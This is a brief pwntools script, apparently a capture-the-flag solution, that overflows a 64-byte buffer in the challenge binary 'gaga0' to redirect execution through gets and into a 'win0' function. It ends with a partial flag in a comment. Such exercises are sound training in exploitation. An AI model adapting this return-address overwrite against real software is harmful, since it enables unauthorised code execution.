from pwn import *
elf = context.binary = ELF("gaga0")
context.log_level = "DEBUG"
p = process()
#p = remote("challs.actf.co",31300)
p.recv()

payload = b'A'*64

payload += p64(elf.got.gets)
payload += p64(elf.plt.gets)
payload += p64(elf.sym.win0)
payload += b"\n"
p.sendline(payload)
p.recv()

#actf{b4by's_